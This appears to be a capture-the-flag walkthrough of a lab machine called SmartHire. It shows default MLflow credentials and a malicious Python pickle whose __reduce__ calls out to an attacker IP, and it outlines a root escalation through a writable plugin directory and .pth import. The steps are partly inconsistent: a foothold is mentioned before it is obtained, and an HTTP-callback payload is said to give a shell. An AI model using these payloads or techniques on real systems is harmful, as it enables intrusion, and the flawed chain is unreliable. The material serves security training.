# SmartHire

**Machine:** SmartHire\
**OS:** Linux\
**Difficulty:** Medium

***

### Overview

SmartHire is a Linux machine built around a web application and an MLflow machine-learning infrastructure.

The attack chain is:

```
Web Enumeration
      ↓
models.smarthire.htb
      ↓
MLflow
      ↓
Default Credentials
      ↓
MLflow Model Artifact
      ↓
Python Pickle Deserialization
      ↓
Foothold as svcweb
      ↓
Python 3.10 Environment
      ↓
Privilege Escalation
      ↓
Root
```

The interesting part of the machine is the abuse of an MLflow-hosted Python model. The application loads a serialized `pickle` model, allowing a malicious pickle to achieve code execution.

***

## 1. Reconnaissance

I started with a full TCP port scan:

```bash
nmap -p- --min-rate 10000 <TARGET_IP>
```

I then enumerated the discovered services:

```bash
nmap -p 22,80 -sCV <TARGET_IP>
```

The web application was hosted on:

```
smarthire.htb
```

I added the hostname to `/etc/hosts`:

```bash
echo "<TARGET_IP> smarthire.htb" | sudo tee -a /etc/hosts
```

***

## 2. Web Enumeration

The main website exposed functionality related to the SmartHIRE recruitment application.

I enumerated the web application and its virtual hosts.

```bash
ffuf -u http://smarthire.htb/ \
     -H 'Host: FUZZ.smarthire.htb' \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -ac
```

This revealed:

```
models.smarthire.htb
```

I added the new hostname:

```bash
echo "<TARGET_IP> models.smarthire.htb" | sudo tee -a /etc/hosts
```

***

## 3. MLflow

Visiting:

```
http://models.smarthire.htb
```

revealed an MLflow instance.

The MLflow API required authentication.

During enumeration, the credentials:

```
admin:password
```

were found to work.

I could therefore interact with the MLflow artifact API.

***

## 4. Enumerating the Application Data

The SmartHIRE application worked with candidate information in CSV format.

The expected structure was:

```csv
name,skills,experience,education,position_applied,previous_company
John Smith,"Python, Machine Learning, SQL",60,Master's in CS,Data Scientist,TechCorp
Sarah Johnson,"JavaScript, React, Node.js",36,Bachelor's in SE,Full Stack Dev,StartupXYZ
Mike Brown,"Java, Spring Boot, PostgreSQL",84,Bachelor's in IT,Backend Developer,Enterprise Inc
```

The application used a machine-learning model stored in MLflow.

***

## 5. Downloading the Model Artifact

The model artifact could be accessed through the MLflow artifact API.

I downloaded the Python model:

```bash
curl -u admin:password -o - \
http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/32ab8e5f6f9c4768ba9d8739dec1616b/artifacts/model/python_model.pkl
```

The important file was:

```
python_model.pkl
```

This immediately suggested investigating how the application loaded the model.

***

## 6. Python Version Enumeration

After obtaining the foothold, I enumerated the environment:

```bash
python3 --version
```

The machine was running:

```
Python 3.10
```

This was important for building the malicious pickle.

Rather than using the system Python environment on my Kali machine, I used `uv` to execute the payload with **Python 3.10** and provide the required `requests` dependency:

```bash
uv run --with requests --python 3.10 payload.py
```

This gives us a controlled Python 3.10 environment for generating the payload.

***

## 7. Understanding Python Pickle

The model was serialized using Python's `pickle` mechanism.

Pickle is dangerous when untrusted data is deserialized because it is capable of invoking functions during object reconstruction.

The key mechanism is the `__reduce__()` method.

A malicious object can specify:

```python
def __reduce__(self):
    return some_function, (arguments,)
```

When Python later deserializes the object, the specified function can be invoked.

This gives us a code-execution primitive.

***

## 8. Creating the Malicious Pickle

I created the following payload:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return requests.get, ("http://10.10.14.171:9001",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

The important portion is:

```python
def __reduce__(self):
    return requests.get, ("http://10.10.14.171:9001",)
```

During deserialization, Python reconstructs the object by invoking:

```python
requests.get("http://10.10.14.171:9001")
```

The resulting execution flow is:

```
payload.pkl
     ↓
pickle.load()
     ↓
Payload.__reduce__()
     ↓
requests.get()
     ↓
10.10.14.171:9001
```

The `os` import is not required for this particular payload.

***

## 9. Generating the Payload with Python 3.10

Because the target environment was running Python 3.10, I generated the pickle using the same Python version.

Using `uv`:

```bash
uv run --with requests --python 3.10 payload.py
```

This generated:

```
payload.pkl
```

The important point is that `uv` lets us explicitly select Python 3.10 rather than relying on whatever Python version happens to be installed on Kali.

***

## 10. Replacing the MLflow Model

The vulnerable model artifact was:

```
model/python_model.pkl
```

The original artifact could be accessed using:

```bash
curl -u admin:password -o - \
http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/32ab8e5f6f9c4768ba9d8739dec1616b/artifacts/model/python_model.pkl
```

The malicious pickle was then used in place of the original model artifact.

The objective was to make the SmartHIRE application load our malicious object when it subsequently loaded the model.

***

## 11. Triggering the Deserialization

The `/predict` functionality causes the application to load the machine-learning model.

Therefore, after replacing the model artifact, accessing the prediction functionality causes the application to deserialize our malicious pickle.

The chain becomes:

```
/predict
   ↓
Load ML model
   ↓
Load python_model.pkl
   ↓
pickle deserialization
   ↓
__reduce__()
   ↓
requests.get()
```

This provides code execution in the context of the application.

The resulting foothold was obtained as:

```
svcweb
```

***

## 12. Foothold Enumeration

Once inside the machine, I started enumerating the environment:

```bash
whoami
id
hostname
pwd
```

The Python environment was particularly interesting:

```bash
python3 --version
```

which returned:

```
Python 3.10
```

This confirmed the Python runtime that was relevant to the exploitation chain.

***

## 13. Privilege Escalation Enumeration

I checked the available sudo privileges:

```bash
sudo -l
```

This revealed a privileged Python management script.

The script was:

```
/opt/tools/mlflow_ctl/mlflowctl.py
```

and could be executed with elevated privileges.

I then inspected the script to understand how it handled Python modules and plugins.

***

## 14. Python Plugin Loading

The privileged script interacted with a Python plugin directory.

The interesting behavior involved adding a directory to Python's module search path.

This meant that files placed in the plugin directory could influence the behavior of the Python process.

The directory was writable by a group that the compromised user belonged to.

This gave us a path from:

```
svcweb
```

to:

```
root
```

through Python's import/startup mechanisms.

***

## 15. `.pth` File Abuse

Python processes `.pth` files when initializing site-package directories.

A `.pth` file can contain an import statement such as:

```
import malicious
```

If Python processes a writable directory containing such a file, the imported module can execute code.

Therefore, I created a malicious Python module and corresponding `.pth` file in the writable plugin directory.

Conceptually:

```
Writable plugin directory
        ↓
malicious .pth
        ↓
Python processes .pth
        ↓
malicious module imported
        ↓
code executes as root
```

The critical condition was that the vulnerable Python management script was executed with root privileges.

***

## 16. Root

After triggering the privileged Python process:

```bash
whoami
```

returned:

```
root
```

The machine was therefore fully compromised.

***

## Attack Chain

The complete attack chain can be summarized as:

```
Port Scan
   ↓
smarthire.htb
   ↓
Virtual Host Enumeration
   ↓
models.smarthire.htb
   ↓
MLflow
   ↓
admin:password
   ↓
MLflow Artifact API
   ↓
python_model.pkl
   ↓
Python Pickle Deserialization
   ↓
Malicious __reduce__()
   ↓
Code Execution
   ↓
svcweb
   ↓
Python 3.10 Enumeration
   ↓
Privileged mlflowctl.py
   ↓
Writable Python Plugin Directory
   ↓
.pth File
   ↓
Python Import Execution
   ↓
root
```

***

## Key Takeaways

#### 1. MLflow is part of the attack surface

Machine-learning infrastructure should not be treated as inherently trusted.

MLflow artifacts can contain executable Python objects, especially when models use Python serialization mechanisms.

#### 2. Pickle is unsafe for untrusted data

The critical primitive was:

```python
def __reduce__(self):
    return requests.get, ("http://10.10.14.171:9001",)
```

Deserializing an attacker-controlled pickle can result in arbitrary function execution.

#### 3. Match the target Python environment

Enumeration showed that the relevant environment used:

```
Python 3.10
```

I therefore generated the payload using:

```bash
uv run --with requests --python 3.10 payload.py
```

Using `uv` made it possible to explicitly reproduce the target Python version while providing the `requests` dependency.

#### 4. Writable Python plugin directories are dangerous

A directory writable by an unprivileged user becomes particularly dangerous when it is later loaded by a Python process running as root.

#### 5. `.pth` files can provide code execution

Python `.pth` files can execute imports during interpreter initialization, making writable Python search paths a useful privilege-escalation primitive.

***

## Tools Used

| Tool          | Purpose                              |
| ------------- | ------------------------------------ |
| `nmap`        | Port/service enumeration             |
| `ffuf`        | Virtual-host enumeration             |
| `curl`        | HTTP and MLflow API interaction      |
| `uv`          | Python 3.10 execution/environment    |
| `pickle`      | Python serialization/deserialization |
| `requests`    | HTTP callback primitive              |
| `sudo`        | Privilege escalation enumeration     |
| Python `.pth` | Startup/import execution             |

***

## Conclusion

SmartHire demonstrates an attack chain where an exposed machine-learning infrastructure becomes the initial entry point.

The most interesting part of the box is the transition from an MLflow model artifact to code execution:

```
MLflow
  ↓
Model Artifact
  ↓
Python Pickle
  ↓
Unsafe Deserialization
  ↓
Code Execution
```

The privilege escalation then abuses the Python runtime itself:

```
svcweb
  ↓
Privileged Python Script
  ↓
Writable Plugin Directory
  ↓
.pth File
  ↓
Python Import
  ↓
root
```

The box highlights an important security principle: **machine-learning infrastructure, model artifacts, and Python runtime configuration all need to be treated as security-sensitive components.**
